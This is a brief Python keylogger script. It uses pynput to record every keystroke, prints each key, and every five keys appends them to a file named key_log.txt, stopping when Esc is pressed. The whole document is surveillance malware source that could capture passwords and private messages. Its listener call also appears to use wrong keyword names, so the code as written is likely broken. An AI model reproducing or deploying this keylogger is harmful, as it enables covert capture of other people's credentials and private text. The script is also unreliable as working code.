
count = 0
keys = []

from pynput.keyboard import Key, Listener

def key_press(key):
    global keys, count

    keys.append(key)
    count += 1
    print("{0} pressed".format(key))

    if count >= 5:
        count = 0
        write_file(keys)
        keys = []

   

def write_file(keys):
    with open("key_log.txt", "a") as f:
        for key in keys:
            k = str(key).replace("'"," ")
            if k.find("space") > 0:
                f.write(str('\n'))
            elif k.find("key") == -1:
                f.write(k)


def key_release(key):
    if key == Key.esc:
        return False

with Listener(key_press=key_press, key_release=key_release) as listener:
    listener.join()
    
